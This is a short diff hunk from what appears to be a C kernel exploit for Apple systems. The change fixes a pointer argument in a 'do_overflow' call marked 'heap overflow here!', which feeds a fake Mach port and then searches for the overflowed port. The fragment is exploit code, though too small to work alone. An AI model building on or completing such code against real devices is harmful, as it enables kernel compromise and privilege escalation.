@@ -237,7 +237,7 @@ int main()
     }
     
     //heap overflow here!
-    do_overflow(0x100, 8, (uint8_t*)&fakeport);
+    do_overflow(0x100, 8, (uint8_t*)fakeport);
     
     // 300 - 500 find overflow port
     mach_port_t foundport = 0;
